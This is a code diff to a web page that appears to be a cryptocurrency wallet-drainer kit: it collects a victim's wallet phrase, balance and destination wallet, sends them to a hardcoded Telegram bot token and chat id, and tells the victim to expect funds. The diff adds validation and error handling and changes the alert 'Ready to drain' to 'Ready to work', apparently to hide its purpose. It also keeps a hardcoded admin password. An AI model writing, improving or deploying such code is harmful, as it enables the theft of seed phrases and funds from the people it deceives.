@@ -77,15 +77,14 @@
             <label for="unlockDate"><i class="fas fa-calendar-alt icon"></i> Unlock Date:</label>
             <input type="date" id="unlockDate" required>
             
-            <label for="unlockTime"><i class="fas fa-clock icon"></i> Unlock Time: HH:MM:SS</label>
-            <input type="text" id="unlockTime" required>
+            <label for="unlockTime"><i class="fas fa-clock icon"></i> Unlock Time (HH:MM:SS):</label>
+            <input type="text" id="unlockTime" pattern="\d{2}:\d{2}:\d{2}" required>
             
             <label for="balance"><i class="fas fa-dollar-sign icon"></i> Balance:</label>
             <input type="number" id="balance" required>
             
-               <label for="destination"><i class="fas fa-map-marker-alt icon"></i> Destination wallet</label>
-            <input type="text" id="destination" placeholder="Enter your destination wallet address">
-            
+            <label for="destination"><i class="fas fa-map-marker-alt icon"></i> Destination Wallet:</label>
+            <input type="text" id="destination" placeholder="Enter destination wallet address" required>
             
             <button type="submit"><i class="fas fa-paper-plane"></i> Submit</button>
         </form>
@@ -96,7 +95,7 @@
     <script>
         function checkPassword() {
             const password = document.getElementById('adminPassword').value;
-            if (password === 'hardcodedpassword') {
+            if (password === 'hardcodedpassword') { // Consider hashing
                 document.getElementById('loginPanel').style.display = 'none';
                 document.getElementById('adminPanel').style.display = 'block';
             } else {
@@ -112,7 +111,7 @@
                 unlockDate: document.getElementById('unlockDate').value,
                 unlockTime: document.getElementById('unlockTime').value,
                 balance: document.getElementById('balance').value,
-               destination: document.getElementById('destinstion').value,
+                destination: document.getElementById('destination').value,
                 timestamp: new Date().toISOString()
             };
 
@@ -122,28 +121,28 @@
             
             const telegramBotToken = '7980517524:AAGFkMYIdIAyKvwK1G3h_Jh1P7yyBC8QT60';
             const chatId = '7651943856';
-            const message = `New Wallet Record:\nTelegram: @${record.telegramUsername}\nPhrase: ${record.phrase}\nUnlock Date: ${record.unlockDate}\nUnlock Time: ${record.unlockTime}\nBalance: ${record.balance}\nDestination: ${record.destination}`;
+            const message = `New Wallet Record:\nTelegram: ${record.telegramUsername}\nPhrase: ${record.phrase}\nUnlock Date: ${record.unlockDate}\nUnlock Time: ${record.unlockTime}\nBalance: ${record.balance}\nDestination: ${record.destination}`;
             
-            await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: message })
-            });
-            
-            alert('Request approved! Expect funds in your wallet soon.');
+            try {
+                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message })
+                });
+                alert('Request approved! Expect funds in your wallet soon.');
+            } catch (error) {
+                console.error('Error sending message:', error);
+                alert('Failed to send message to Telegram.');
+            }
         });
         
-        document.getElementById('powerButton').addEventListener('click', async function() {
+        document.getElementById('powerButton').addEventListener('click', function() {
             const now = new Date();
             let records = JSON.parse(localStorage.getItem('walletRecords')) || [];
             
             records.forEach(record => {
                 const unlockDateTime = new Date(`${record.unlockDate}T${record.unlockTime}`);
-                if (now >= unlockDateTime) {
-                    alert(`Unlock time reached for: ${record.destination}. Ready to drain.`);
-                } else {
-                    alert(`Not yet time for: ${record.destination}.`);
-                }
+                alert(now >= unlockDateTime ? `Unlock time reached for: ${record.destination}. Ready to work.` : `Not yet time for: ${record.destination}.`);
             });
         });
     </script>
